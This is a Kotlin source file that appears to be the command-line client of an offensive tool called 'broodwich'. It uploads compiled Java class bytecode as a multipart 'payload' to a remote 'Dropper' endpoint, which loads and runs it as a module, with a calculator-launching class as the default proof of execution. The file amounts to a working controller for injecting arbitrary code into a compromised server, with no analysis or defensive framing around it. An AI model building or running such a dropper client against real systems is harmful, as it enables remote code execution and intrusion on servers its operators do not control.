package party.itistimeto.broodwich

import com.github.ajalt.clikt.core.CliktCommand
import com.github.ajalt.clikt.parameters.options.default
import com.github.ajalt.clikt.parameters.options.option
import okhttp3.*
import java.io.File


class Client : CliktCommand() {
    val url: String by option().default("http://localhost:8090/")
    val module: String by option().default(Dropper.loaderModuleId)
    val params: String by option().default("party.itistimeto.broodwich.modules.Calc")
    // todo: key

    override fun run() {
        if(module == Dropper.loaderModuleId) {
            val moduleByteCode = File(javaClass.classLoader.getResource(params.replace(".", "/") + ".class").toURI())
            val client = OkHttpClient()
            val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart(Dropper.moduleIdKey, module)
                    .addFormDataPart(Dropper.payloadKey, "wyad", RequestBody.Companion.create(MediaType.parse("application/octet-stream"), moduleByteCode))
                    .addFormDataPart(Dropper.payloadLengthKey, moduleByteCode.length().toString())
                    .addFormDataPart(Dropper.moduleParamsKey, params)
                    .build()

            val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build()

            client.newCall(request).execute()
        }
    }
}

fun main(args: Array<String>) = Client().main(args)